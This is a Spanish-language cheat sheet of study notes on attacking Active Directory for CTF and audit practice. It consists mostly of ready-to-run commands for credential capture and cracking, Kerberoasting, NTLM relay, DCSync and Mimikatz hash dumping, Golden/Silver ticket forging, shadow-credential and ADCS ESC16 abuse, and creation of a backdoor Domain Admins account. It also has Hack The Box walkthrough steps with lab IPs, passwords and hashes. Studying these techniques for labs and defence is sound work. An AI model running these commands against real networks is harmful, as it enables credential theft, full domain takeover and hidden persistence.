---
title: "Apuntes Active Directory"
description: "Descripcion"
date: "2025-12-16"
tags: ["AD"]   
---



# 🗺️ Mapa de Estudio: Active Directory para CTF

---

## 🔹 Estructura de AD (Analogía con Archivos/Directorios)

📂 Dominio (DC) "/"
├─ 📂 OU: Usuarios
│ ├─ 🔑 Usuario: 
│ └─ 🔑 Usuario: 
├─ 📂 OU: Equipos
│ ├─ 🖥️ Equipo: WORKSTATION1
│ └─ 🖥️ Equipo: SERVER1
├─ 🗄️ GPOs "/GPOs"
└─ 🗄️ Share SMB "/Compartida"
├─ 🗄️ Archivo: documento1.docx
└─ 🗄️ Archivo: secreto.xlsx

---

## 🔹 Flujo de ataque CTF

1. **Escaneo de red**
   - Herramientas: `nmap`, `masscan`  
   - Objetivo: descubrir SMB (445), LDAP (389/636), RPC (135-139/49152+)

2. **Enumeración**
   - **📂 LDAP:** listar usuarios, grupos, OU, SPNs  
     - `ldapsearch -x -h <IP> -b "DC=dominio,DC=com"`  
     - `enum4linux-ng -a <IP>`  
   - **🗄️ SMB:** listar shares y permisos, sesiones nulas  
     - `smbclient -L //<IP> -N`  
     - `smbmap -H <IP>`  
     - `crackmapexec smb <IP> --shares -u '' -p ''`  
   - **🖥️ RPC/RSP:** información de máquinas y políticas  
     - `rpcclient -U "" <IP>`  
     - `crackmapexec smb <IP> --users --groups --policies`

3. **Ataques a Kerberos**
   - 🔑 **AS-REP Roasting:** usuarios sin preauth  
     - `GetNPUsers.py <domain>/<user> -no-pass -dc-ip <IP>`  
   - 🔑 **Kerberoasting:** extraer tickets SPN  
     - `GetUserSPNs.py <domain>/<user> -request -dc-ip <IP>`  
   - 🔑 **Pass-the-Ticket / Overpass-the-Hash:** lateral movement  
     - `Rubeus.exe ptt /ticket:<ticket>`

4. **Escalada / Acceso a recursos**
   - Usar hashes o tickets obtenidos para acceder a shares, GPOs o máquinas  
   - Mantener registro de todo: IPs, usuarios, SPNs, hashes, permisos

---

💡 **Tip de estudio rápido:**  
- Visualiza AD como un **árbol de carpetas**:  
  - 📂 LDAP = leer la estructura  
  - 🗄️ SMB = acceder a archivos compartidos  
  - 🔑 Kerberos = llave para abrir carpetas protegidas  
  - 🖥️ RPC = administrar máquinas remotas  
- Esto te ayuda a memorizar rutas de ataque y herramientas de forma intuitiva.

---

## 🔹 Cracking & formatos (referencia rápida)

-  Hashcat modos útiles
    

```
- 1000  : NTLM
- 3000  : LM
- 5600  : NetNTLMv2
- 13100 : Kerberos 5 TGS-REP (etype23)
- 19600 : Kerberos 5 TGS-REP (AES256)
- 18200 : Kerberos 5 AS-REP (etype23)
```

-  Ejemplos
    

```bash
hashcat -m 1000 ntlm.txt rockyou.txt --force
hashcat -m 5600 netntlmv2.txt rockyou.txt --force
```

---
## 🔹 Delegaciones y técnicas avanzadas (según hallazgos)

-  RBCD (Resource-Based Constrained Delegation)
    

```bash
# Si tenemos GenericWrite/WriteOwner sobre un equipo objetivo
# (usar bloodhound-python para confirmar)
# Flujo típico: addcomputer → set RBCD → getST → psexec
```

-  Shadow Credentials (KeyCredentialLink)
    

```bash
# Agregar credencial de clave a objeto que controlamos → PKINIT → TGT
```

-  AD CS (Certipy)
    

```bash
certipy find/request/auth -u <user>@<DOMINIO.LOCAL> -p '<pass>' -dc-ip <DC_IP>
```

---
## 🔹 LLMNR/NBT-NS & NTLM Relay (si la red lo permite)

-  Captura de NetNTLMv2
    

```bash
sudo responder -I <IFACE> -dwv
# Crack: hashcat -m 5600 netntlmv2.txt rockyou.txt
```

-  NTLM Relay → LDAP/SMB
    

```bash
ntlmrelayx.py -t ldap://<DC_IP> -smb2support --no-smb-server --dump-adcs --dump-laps
```

> _Marca si SMB/LDAP signing bloquea el relay._

**Notas/Evidencia:**

```
- Hashes capturados: ...
- Relay posible: sí/no
```

---
Extracción de hashes

```bash
secretsdump.py dominio.local/usuario:contraseña@<IP>

# o con hash
secretsdump.py dominio.local/usuario@<IP> -hashes :<NTLMHASH>
```




# Metodología de Auditoría (Paso a Paso)

El flujo de trabajo de una auditoría de AD sigue una progresión lógica para descubrir vulnerabilidades.

### 2.1 🧭 Fase de Reconocimiento y Descubrimiento

Esta fase se enfoca en mapear la red y los servicios de AD sin autenticación.

**Objetivos:**

- Identificar el **Domain Controller (DC)** y otros hosts relevantes.
    
- Enumerar los servicios abiertos, especialmente aquellos relacionados con AD.
    

**Herramientas y Comandos:**

|Categoría|Herramienta|Comando Ejemplo|Notas|
|---|---|---|---|
|**Host Discovery**|`nmap`|`nmap -sn <RANGO/24> -oA scans/ping-sweep`|Escaneo rápido de hosts activos.|
|**Puertos Críticos AD**|`nmap`|`nmap -sT -sV -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,5986,3389 <IP> -oA scans/ad-core`|Escaneo completo de los puertos más importantes de AD.|
|**Descubrimiento del Dominio**|`nmap`|`nmap -n -P0 -p 53,88,389,445 --script smb-os-discovery.nse <IP>`|Muestra la información del sistema operativo y dominio.|
|**Consulta DNS**|`nslookup`|`nslookup -type=SRV _ldap._tcp.dc._msdcs.<DOMINIO.LOCAL>`|Permite identificar los Domain Controllers.|



---

### 2.2 🔎 Fase de Enumeración Sin Credenciales

Una vez que identificas los hosts, la enumeración busca información valiosa sin necesidad de tener un usuario y contraseña.

**Objetivos:**

- Descubrir recursos compartidos y permisos de usuario.
    
- Enumerar usuarios, grupos y políticas de contraseñas.
    
- Detectar posibles vulnerabilidades como AS-REP Roasting.
    

**Herramientas y Comandos:**

|Categoría|Herramienta|Comando Ejemplo|Notas|
|---|---|---|---|
|**Enumeración SMB**|`smbclient` `crackmapexec` `smbmap`|`smbclient -N -L // <IP>` `cme smb <IP> --shares` `smbmap -H <IP> -u 'null'`|Listar recursos compartidos (shares).|
|**Enumeración de Usuarios**|`enum4linux-ng` `rpcclient` `cme`|`enum4linux-ng -A <IP>` `rpcclient -U "" -N <IP>` `cme smb <IP> --users`|Obtener una lista de usuarios y grupos.|
|**Enumeración LDAP**|`ldapsearch`|`ldapsearch -x -H ldap://<IP> -b "dc=dom,dc=local" "(objectClass=user)" sAMAccountName`|Consultar la base de datos de AD de forma anónima.|
|**Reconocimiento Kerberos**|`kerbrute`|`kerbrute userenum -d <DOMINIO.LOCAL> --dc <DC_IP> users.txt`|Enumerar usuarios válidos a través de Kerberos.|



---

### 2.3 🔑 Fase de Obtención de Credenciales

Esta fase utiliza la información de la enumeración para conseguir credenciales iniciales.

**Objetivos:**

- Obtener hashes de contraseñas de usuarios.
    
- Encontrar credenciales en texto claro en recursos compartidos.
    

**Ataques y Comandos:**

|Ataque|Herramienta|Comando Ejemplo|Notas|
|---|---|---|---|
|**AS-REP Roasting**|`impacket-GetNPUsers`|`impacket-GetNPUsers <DOMINIO.LOCAL>/ -dc-ip <DC_IP> -no-pass -usersfile users.txt -outputfile hashes.txt`|Explota usuarios que no requieren preautenticación.|
|**Kerberoasting**|`impacket-GetUserSPNs`|`impacket-GetUserSPNs <DOMINIO.LOCAL>/<user>:<pass> -dc-ip <DC_IP> -request -outputfile tgs_hashes.txt`|Explota cuentas de servicio (SPNs) para obtener hashes crackeables.|
|**GPP Passwords**|`smbclient` `gpp-decrypt`|`smbclient //DC01/SYSVOL -N`|Buscar archivos `Groups.xml` en SYSVOL que contengan contraseñas cifradas.|
|**Captura de Hashes**|`responder`|`responder -I <IFACE> -dwv`|Capturar hashes NTLMv2 de la red.|



---

### 2.4 🏹 Fase de Movimiento Lateral y Escalada de Privilegios

Con credenciales en mano, el objetivo es moverse por la red y escalar privilegios hasta convertirse en un Administrador del Dominio.

**Objetivos:**

- Ejecutar comandos remotamente en otros hosts.
    
- Encontrar rutas de ataque para obtener privilegios.
    

**Herramientas y Comandos:**

|Técnica|Herramienta|Comando Ejemplo|Notas|
|---|---|---|---|
|**RCE (SMB/RPC)**|`impacket-psexec` `impacket-wmiexec`|`impacket-psexec <DOMINIO>/<user>:'<pass>'@<HOST>` `impacket-wmiexec <DOMINIO>/<user>:'<pass>'@<HOST>`|Obtener una shell de comandos remota.|
|**RCE (WinRM)**|`evil-winrm`|`evil-winrm -i <HOST> -u <user> -p '<pass>'`|Shell interactiva a través de WinRM.|
|**Análisis de Rutas**|`BloodHound`|`bloodhound-python -u <user> -p '<pass>' -d <DOMINIO> -ns <DC_IP> -c All`|Mapear visualmente las relaciones y rutas de ataque. Es la herramienta principal de esta fase.|



---

### 2.5 👑 Fase de Dominio del Dominio

El último paso es obtener control total sobre el DC y, por ende, de todo el dominio.

**Objetivos:**

- Extraer todos los hashes de la base de datos AD.
    
- Crear tickets de autenticación con privilegios de administrador.
    
- Crear una cuenta de respaldo para persistencia.
    

**Ataques y Comandos:**

|Ataque|Herramienta|Comando Ejemplo|Notas|
|---|---|---|---|
|**DCSync**|`impacket-secretsdump`|`impacket-secretsdump -just-dc <DOMINIO>/<user>:'<pass>'@<DC_IP>`|Sincronizar la base de datos del DC para extraer todos los hashes.|
|**Golden Ticket**|`impacket` `mimikatz`|`kerberos::golden /domain:dom.local /sid:S-1-5-... /rc4:<NTLM_krbtgt> /user:admin /ticket:golden.tkt`|Crea un ticket de autenticación falso. Requiere el hash de la cuenta `krbtgt`.|
|**Persistencia**|`net user` `net group`|`net user backdoor <pass> /add /domain` `net group "Domain Admins" backdoor /add /domain`|Crea una cuenta de respaldo para mantener el acceso.|


---
## 🎨 3. Referencia Rápida

### 3.1 Puertos Críticos de AD

|Puerto|Servicio|Significado|
|---|---|---|
|**53**|DNS|Resolución de nombres de dominio.|
|**88**|Kerberos|Protocolo de autenticación.|
|**135**|MSRPC|Llamadas a procedimientos remotos.|
|**139/445**|SMB|Transferencia de archivos y recursos compartidos.|
|**389**|LDAP|Acceso al directorio de AD.|
|**636**|LDAPS|LDAP seguro.|
|**3268/9**|Global Catalog|Búsquedas en el bosque.|
|**5985/6**|WinRM|Gestión remota.|



---



### ⚠️ 3.2 Vulnerabilidades Comunes

- **Kerberoasting**: Explotar cuentas de servicio con SPNs para obtener hashes débiles.
    
- **AS-REP Roasting**: Obtener hashes de usuarios que no requieren preautenticación.
    
- **Delegaciones Inseguras**: Abusar de las configuraciones de delegación para suplantar a usuarios de alto privilegio.
    
- **ACLs Peligrosas**: Encontrar permisos de control (`GenericAll`, `WriteDACL`) que permitan escalar privilegios.
    
- **GPP Passwords**: Credenciales en texto claro en archivos de políticas de grupo.


# 🗺️ Mapa de Vectores de Ataque a Active Directory (CTF)
### Golden Ticket

El ataque de Golden Ticket es una técnica avanzada que explota el funcionamiento interno del protocolo Kerberos en entornos de Active Directory. En esencia, este ataque permite a un atacante generar tickets de autenticación válidos sin necesidad de pasar por el proceso normal de autenticación del dominio. Esto se logra obteniendo el hash de la cuenta `krbtgt`, una cuenta especial utilizada por el controlador de dominio para firmar los Ticket Granting Tickets (TGTs). Una vez que el atacante tiene este hash, puede usar herramientas como Mimikatz para generar un TGT falso —el llamado "Golden Ticket"— que puede incluir cualquier identidad y privilegios deseados, incluso acceso como administrador del dominio.

Este ticket falsificado puede inyectarse en una sesión activa (por ejemplo, en una máquina como WIN10-PC2), y a partir de ahí, el atacante puede autenticarse ante el controlador de dominio como si fuera un usuario legítimo. Esto le permite acceder a otros recursos del dominio, como servidores de archivos (ej. FILESERVER), estaciones de trabajo, o incluso a los propios controladores de dominio, sin necesidad de credenciales reales. Además, como el atacante puede establecer el tiempo de validez del ticket, este acceso puede mantenerse durante largos periodos sin ser detectado.

El ataque Golden Ticket es particularmente grave porque incluso si las contraseñas de los usuarios comprometidos se cambian, el acceso persistente se mantiene hasta que el hash de `krbtgt` sea rotado dos veces, lo cual es un proceso sensible y que requiere cuidado. Por esto, es considerado una técnica de post-explotación crítica y de alta peligrosidad en escenarios de compromiso total del dominio.

El "Golden Ticket" permite crear tickets TGT falsificados usando la clave de servicio de `krbtgt`, lo que otorga acceso completo al dominio.

Para esto necesitas:

* El hash de la cuenta `krbtgt`
* El nombre del dominio
* El SID del dominio

Ejemplo con `impacket-psexec`:

```bash
impacket-psexec enterprise.com/Administrator:'Password'@IP(AD)
```

Este acceso es útil para moverse lateralmente dentro del dominio una vez generado un TGT válido.


### Abuso de Delegaciones

Constrained Delegation:

```bash
getST.py -spn cifs/servidor.dominio.local -impersonate objetivo dominio.local/usuario:pass -dc-ip <IP>
psexec.py -k -no-pass dominio.local/objetivo@servidor
```

Unconstrained Delegation:

* Usar Mimikatz (`sekurlsa::tickets`) para extraer TGT.

### Abuso de ACLs

Añadir miembro a grupo:

```bash
net rpc group addmem "Domain Admins" usuario -S <IP> -U atacante%contraseña
```

Cambiar contraseña de otra cuenta:

```bash
net rpc changepassword victima -U atacante%pass -S <IP>
```

### Ataques a ADCS

Enumerar:

```bash
certipy find -u usuario -p contraseña -target <IP> -dc-ip <IP>
```

Solicitar certificado abusando de plantilla vulnerable:

```bash
certipy req -u usuario -p pass -ca ca.nombre.local -template vulnerable_template -dc-ip <IP> -target <IP>
```

### MSSQL--> Content Header:Salt:Hash

Para romper hashes de contraseñas de SQL Server, puedes usar herramientas como `hashcat` o `john`:

```bash
# Con hashcat (modo 1731 para MSSQL 2012+)
hashcat -m 1731 --force -a 0 hash.mssql diccionario.txt

# Con John the Ripper
john --format=mssql12 --wordlist=diccionario.txt hash.mssql
```

> **Nota:** El modo 1731 corresponde a hashes de SQL Server 2012 en adelante (`mssql12` en John).

El procedimiento extendido `xp_cmdshell` permite ejecutar comandos del sistema operativo directamente desde SQL Server. Esto puede facilitar la escalada de privilegios o la persistencia.

```sql
-- Permite ejecutar comandos del sistema desde MSSQL
EXEC xp_cmdshell 'whoami';
```

Para automatizar esto con Metasploit:

```bash
use auxiliary/admin/mssql/mssql_exec
```

> **Precaución:** `xp_cmdshell` suele estar deshabilitado por defecto. Se requiere acceso privilegiado para activarlo.



### Mimikatz.exe

Con Mimikatz puedes extraer y manipular secretos del sistema, como el hash de la cuenta `krbtgt` necesario para generar Golden Tickets:

```bash
lsadump::lsa /inject /name:krbtgt
```

> Este comando requiere privilegios de SYSTEM. Una vez obtenido el hash, puede utilizarse para falsificar tickets TGT con herramientas como `ticketer.py` de Impacket.

Obtenemos el ID y NTLM y creamos el ticket.

```
kerberos::golden /domain:enterprise.com /sid:ID /rc4:NTLM /user:Administrator /ticket:ticket
```


---




### AS -REP Roasting Attack

Solo requiere listado de usuarios.

```
impacket-GetNPUsers -dc-ip IP(AD) dominio.com/ -no-pass -userfile users.txt -outfile salida.txt
```

Para crackear la contraseña.

```
hashcat --help | grep AS_REP --> 18200
```

Para ver si corre base de datos

```
nmap -n -P0 -p 1433 -sV --open -vv IP(AD)
```

Obtener credenciales.

```
crackmapexec mssql IP(AD) -u usuarios.txt -p diccionario.txt --local-auth --continue-on-success
```

```
msfconsole -q
use auxiliary/admin/mssql/mssql_sql
set RHOST IP(AD)
set PASSWORD
set SQL select password.hash from sys.sql_logins

#caracteristicas de la base de datos
use auxiliary/admin/mssql/mssql_enum
```

### Kerbrute



Poner `/etc/hosts`.

```
IP nombre_dominio nombre_PC nombre_PC.nombre_dominio
```

Al instalar le damos permisos de ejecución. Vemos usuarios posibles.

```
./kerbrute_linux_amd64 userenum -d cicada.htb --dc 10.10.11.71 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
```

Hacemos password-spraying.

```
./kerbrute_linux_amd64 userenum -d cicada.htb --dc 10.10.11.35 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
```

Ahora fuerza bruta de contraseñas.

```
./kerbrute_linux_amd64 bruteuser -d cicada.htb --dc 10.10.11.35 pass.txt emily.oscars
```
### Kerberoasting

Explicación de cada tipo de ataque

- **AS-REP Roasting:** Se enfoca en usuarios que no requieren preautenticación. Permite obtener hashes de contraseñas directamente desde los tickets AS-REP, que luego se pueden crackear offline.  
- **Kerberoasting:** Aprovecha cuentas de servicio con SPNs registrados. Obtienes tickets TGS que se pueden crackear offline para revelar contraseñas de cuentas de servicio con privilegios.  
- **Pass-the-Ticket (PTT):** Permite usar tickets Kerberos válidos capturados para autenticarse como otro usuario sin necesidad de conocer su contraseña.  
- **Golden Ticket:** Permite crear un ticket TGT falso con control completo del dominio, otorgando acceso ilimitado a cualquier recurso.  
- **Silver Ticket:** Similar al Golden Ticket, pero limitado a un servicio específico. Permite autenticarse como cualquier usuario para un recurso concreto sin alertar al DC.  
- **Request TGS de un SPN específico:** Permite obtener un ticket de servicio para un SPN concreto y luego usarlo en movimientos laterales o escalamiento de privilegios.

Windows solía permitir almacenar contraseñas en texto cifrado (pero fácilmente descifrable) en archivos XML dentro de políticas de grupo (GPP) en controladores de dominio. Aunque esta práctica fue desaconsejada desde hace tiempo, aún se encuentran entornos vulnerables.

Utiliza la herramienta `smbmap` para conectarse al recurso compartido SMB del host con IP 10.10.10.100. A través del argumento `--download` se solicita la descarga del archivo `Groups.xml` ubicado en el directorio `Policies`, específicamente dentro de la ruta correspondiente a una política de grupo activa. Este archivo es relevante porque dentro de los controladores de dominio, las GPO pueden contener credenciales administrativas mal configuradas, particularmente dentro del directorio SYSVOL, el cual suele estar accesible para cualquier usuario del dominio, lo que representa una seria vulnerabilidad si se almacenan contraseñas en él.

```
smbmap -H 10.10.10.100 --download Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
```

Mostrar el contenido completo del archivo XML descargado.

```
cat 10.10.10.100-Replication_active.htb_Policies_{31B2F340-016D-11D2-945F-00C04FB984F9}_MACHINE_Preferences_Groups_Groups.xml
```

Desciframos.

```
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/Ng1VmQ'
```

Si tenemos un usuario con su contraseña dentro de un dominio vemos si es vulnerable. Antes de eso sincronizamos.

```
ntpdate 10.10.10.100 (IP máquina víctima)
```

Intento obtener el Ticket Granting Service.

```
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
```

Crackeamos.

```
john --wordlist=rockyou.txt hash.txt
```

Teniendo la contraseña deshasheada.

```
crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968'
```

Ahora conseguir una shell.

```
impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd.exe


```

###  Shadow Credentials / PKINIT Attack


Obtener control de una **cuenta de servicio** en Active Directory sin conocer la contraseña, usando **shadow credentials**, **PKINIT**, TGT Kerberos y hash NTLM.

---

#### 1️⃣ Preparación / Permisos 🟡
| Acción | Herramienta / Comando |
|--------|----------------------|
| Agregar `p.agila` al grupo Service Accounts | `net rpc group addmem "Service Accounts" "p.agila" -U "dc01.fluffy.htb/p.agila" -S "10.10.11.69"` |

**Emoji / Color:** 🟡 amarillo → manipulación de AD / permisos

---

#### 2️⃣ Shadow Credentials 🟢
| Acción | Herramienta / Comando |
|--------|----------------------|
| Listar shadow credentials existentes de `winrm_svc` | `python3 pywhisker.py -d "dc01.fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "winrm_svc" --action "list"` |
| Agregar nueva credencial shadow (certificado) | `python3 pywhisker.py -d "dc01.fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "winrm_svc" --action "add" --filename key --export PEM` |
| Generar archivos PEM (certificado y clave privada) | `key_cert.pem` y `key_priv.pem` |

**Emoji / Color:** 🟢 verde → PKINIT / Kerberos

---

#### ¿Qué son los **Credential Shadows** en Active Directory?

**Credential Shadows** son un tipo de **credencial adicional asociada a una cuenta de servicio o usuario** en Active Directory.

- **Función principal:** Permitir que una cuenta se autentique usando **certificados, claves o secretos alternativos** sin modificar la contraseña principal.
    
- Se usan típicamente para **servicios automatizados**, como:
    
    - WinRM
        
    - SQL Server
        
    - Otros servicios de Windows que requieren autenticación programática.
        
- Se almacenan como **atributos especiales en AD**, vinculados a la cuenta de servicio.
    
- Pueden ser **certificados X.509** que permiten autenticación Kerberos usando **PKINIT**, o claves simétricas/secretos para otros sistemas.
    

---

#### 3️⃣ Solicitar TGT con PKINIT 🟢
| Acción | Comando |
|--------|---------|
| Solicitar TGT usando certificado | `faketime '2025-08-11 17:31:36' python3 gettgtpkinit.py -cert-pem key_cert.pem -key-pem key_priv.pem fluffy.htb/winrm_svc winrm_svc.ccache` |
| Configurar variable de entorno para usar el TGT | `export KRB5CCNAME=winrm_svc.ccache` |

**Nota:** El TGT permite autenticarse como la cuenta de servicio sin contraseña.

---
#### ¿Qué es **PKINIT**?

**PKINIT** significa **Public Key Cryptography for Initial Authentication in Kerberos**.

- Es una **extensión de Kerberos** que permite usar **criptografía de clave pública** para autenticarse en lugar de solo usar contraseñas.
    
- Básicamente, permite que un usuario o servicio obtenga un **TGT (Ticket Granting Ticket)** usando un **certificado X.509** y su clave privada.
    

---

#### 🔹 Cómo funciona

1. La cuenta de usuario o servicio tiene un **certificado y clave privada** registrados en Active Directory (p. ej., mediante shadow credentials).
    
2. Durante la autenticación Kerberos inicial:
    
    - El cliente envía un mensaje **firmado con su clave privada**.
        
    - El controlador de dominio verifica el mensaje usando la **clave pública asociada** en AD.
        
3. Si es válido, el DC emite un **TGT** para esa cuenta, igual que con la autenticación normal por contraseña.
    

---

#### 4️⃣ Extraer hash NTLM desde TGT 🟢
| Acción | Comando |
|--------|---------|
| Extraer hash NTLM | `faketime '2025-08-11 17:34:24' python3 getnthash.py -key 7e2b09cc396441f397108358ee1a443b205052bd0535a03af66bc3cadbd91b82 fluffy.htb/winrm_svc` |

---
#### 🔹 ¿Qué son los **hashes NTLM**?

**NTLM (NT LAN Manager)** es un **protocolo de autenticación** de Microsoft que todavía se usa en Windows, especialmente cuando Kerberos no está disponible.

- Un **hash NTLM** es básicamente **una representación cifrada de la contraseña de un usuario**.
    
- No es la contraseña en texto claro, pero sirve para **autenticarse en servicios de Windows** que aceptan NTLM, como SMB, RPC o WinRM.
    

---

#### 🔹 Cómo funciona

1. Windows almacena un **hash NTLM** de cada contraseña en la base de datos SAM o en Active Directory.
    
2. Cuando un usuario intenta autenticarse:
    
    - El servidor envía un **reto (challenge)**.
        
    - El cliente combina el **hash NTLM** con el reto para generar una respuesta.
        
    - El servidor compara la respuesta con lo que espera y, si coincide, permite el acceso.
        

> Importante: nunca se envía la contraseña real por la red, solo el hash usado para el challenge-response.

---

#### 5️⃣ Uso del hash NTLM / Movimiento lateral 🔵
| Acción | Comando |
|--------|---------|
| Comprobar acceso SMB con hash | `nxc smb dc01.fluffy.htb -u 'winrm_svc' -H '33bd09dcd697600edf6b3a7af4875767'` |
| Movimiento lateral y escalamiento | Usar hash NTLM en servicios accesibles, SMB, RPC o WinRM |

**Emoji / Color:** 🔵 azul → SMB / lateral movement

---

#### 6️⃣ Flujo resumido paso a paso

1. 🟡 **Preparación AD:**  
   - Usuario p.agila obtiene permisos en Service Accounts.  

2. 🟢 **Shadow Credentials:**  
   - Listar credenciales shadow de `winrm_svc`.  
   - Agregar certificado shadow.  
   - Generar archivos PEM (key_cert.pem & key_priv.pem).  

3. 🟢 **PKINIT / TGT:**  
   - Solicitar TGT Kerberos usando certificado.  
   - Configurar variable KRB5CCNAME.  

4. 🟢 **Extraer NTLM:**  
   - Sacar hash NTLM desde el TGT.  

5. 🔵 **SMB / Movimiento lateral:**  
   - Usar hash NTLM para autenticarse en SMB o RPC.  
   - Escalar privilegios o moverse lateralmente.  

6. 🔴 **Objetivo final:**  
   - Control total de la cuenta de servicio `winrm_svc`.

---

#### 🔹 Notas finales
- Este ataque se llama **Shadow Credentials / PKINIT Attack**.  
- Combina **PKINIT + shadow credentials + TGT Kerberos + hash NTLM**.  
- Muy usado en **CTFs de Active Directory** y auditorías de seguridad avanzada.  
- La chuleta permite **tener todos los comandos y pasos en un solo documento** listo para práctica.







### ADCS ESC16 Attack (CTF)



#### 1️⃣ Enumeración de ADCS 🟡
| Acción | Comando |
|--------|--------|
| Encontrar CA y plantillas vulnerables | `certipy-ad find -u 'ca_svc@fluffy.htb' -hashes <hash> -dc-ip 10.10.11.69 -vulnerable -stdout` |

**Emoji / Color:** 🟡 amarillo → descubrimiento / enumeración

---

#### 2️⃣ Leer UPN de la víctima 🟢
| Acción | Comando |
|--------|--------|
| Leer UPN de la cuenta `ca_svc` | `faketime '<fecha>' certipy-ad account -u "p.agila@fluffy.htb" -p "<pass>" -dc-ip "10.10.11.69" -user 'ca_svc' read` |

**Emoji / Color:** 🟢 verde → recopilación de atributos de AD

---

#### 3️⃣ Actualizar UPN temporalmente 🟢
| Acción | Comando |
|--------|--------|
| Cambiar UPN de `ca_svc` a la cuenta de destino (`administrator`) | `faketime '<fecha>' certipy-ad account -u "p.agila@fluffy.htb" -p "<pass>" -dc-ip "10.10.11.69" -upn 'administrator' -user 'ca_svc' update` |

---

#### 4️⃣ Solicitar certificado vulnerable 🟢
| Acción | Comando |
|--------|--------|
| Solicitar certificado como `administrator` usando plantilla vulnerable | `faketime '<fecha>' certipy-ad req -u "ca_svc@dc01.fluffy.htb" -hashes "<hash>" -ca 'fluffy-DC01-CA' -template User -upn "administrator@sc01.fluffy.htb" -dc-ip "10.10.11.69"` |

---

#### 5️⃣ Revertir UPN de la cuenta víctima 🔵
| Acción | Comando |
|--------|--------|
| Restaurar UPN original de `ca_svc` | `faketime '<fecha>' certipy-ad account -u "p.agila@dc01.fluffy.htb" -p "<pass>" -dc-ip "10.10.11.69" -upn 'ca_svc@$dc01.fluffy.htb' -user 'ca_svc' update` |

---

#### 6️⃣ Autenticación como cuenta de destino 🔴
| Acción | Comando |
|--------|--------|
| Autenticar con el certificado obtenido | `faketime '<fecha>' certipy-ad auth -dc-ip "10.10.11.69" -pfx 'administrator.pfx'` |

**Emoji / Color:** 🔴 rojo → cuenta de alto privilegio

---


#### 🔹 Notas
- Técnica: **ADCS ESC16 (Certificate Template Abuse)**.  
- Permite **escalamiento de privilegios** sin conocer la contraseña de la cuenta de destino.  
- Muy útil en **CTFs y auditorías avanzadas de AD**.

---

###  Privilegios de dominio (DCSync / DC takeover)

-  DCSync (si privilegios lo permiten)
    

```bash

impacket-secretsdump -just-dc <DOMINIO.LOCAL>/<user>:'<pass>'@<DC_IP>

# o con hash:

impacket-secretsdump -just-dc <DOMINIO.LOCAL>/<user>@<DC_IP> -hashes :<NTLM>

```

-  Dump local SAM/LSA en hosts comprometidos
    

```bash

impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL

```

**Notas/Evidencia:**


- DCSync exitoso: sí/no ; hashes: ...


---

###  Dominio del Dominio

### 5.1 DCSync Attack

```bash

impacket-secretsdump -just-dc dominio.local/usuario:password@10.10.10.100

```

### 5.2 Golden Ticket Attack


```bash

# Obtener hash krbtgt

impacket-secretsdump -just-dc-ntlm dominio.local/usuario:password@10.10.10.100

# Crear golden ticket con mimikatz

kerberos::golden /domain:dominio.local /sid:S-1-5-21-... /rc4:<NTLM_krbtgt> /user:Administrator /ticket:golden.tkt

```

### 5.3 Persistencia

```bash

# Crear usuario backdoor

net user backdoor Password123! /add /domain

net group "Domain Admins" backdoor /add /domain

```
---


###  Técnicas de Post-Explotación

###  Post-Explotación con Mimikatz

### 🔹 Uso Básico
```powershell

mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::msv
sekurlsa::kerberos
sekurlsa::tspkg
sekurlsa::wdigest

```

### 🔹 Dump de Hashes
```powershell

lsadump::sam
lsadump::secrets
lsadump::cache

```
  
### 🔹 Tickets Kerberos

```powershell

kerberos::list
kerberos::ptt ticket.kirbi
kerberos::golden /user:Administrator /domain:dominio.htb /sid:S-1-5-21-... /krbtgt:HASH /id:500

```

### 🔹 Exportar credenciales

```powershell

sekurlsa::ekeys
sekurlsa::credman

```

### Extracción de Hashes

```bash

# Con credenciales
secretsdump.py dominio.local/usuario:password@DC01

# Pass-the-Hash
psexec.py dominio.local/administrador@DC01 -hashes :<NTLM_HASH>

```


```bash
# GPP Passwords

smbclient //DC01/SYSVOL -N
gpp-decrypt <Groups.xml>

# Captura de Hashes
responder -I eth0 -dwv

# RCE vía SMB
psexec.py DOM/user:pass@HOST

wmiexec.py DOM/user:pass@HOST

# WinRM
evil-winrm -i <IP> -u user -p pass

# BloodHound
bloodhound-python -u user -p pass -d DOM -ip <DC_IP> -c All

# Pass-the-Hash
cme smb <IP> -u user -H <hash>

# DCSync
secretsdump.py -just-dc DOM/user:pass@DC_IP

# Golden Ticket
mimikatz # kerberos::golden /domain:DOM.LOCAL /sid:<SID> /rc4:<krbtgt_hash> /user:admin

# Silver Ticket
mimikatz # kerberos::golden /domain:DOM.LOCAL /target:HOST /rc4:<service_hash> /user:fakeuser

# Persistencia
net user backdoor Pass123 /add /domain

net group "Domain Admins" backdoor /add /domain

```










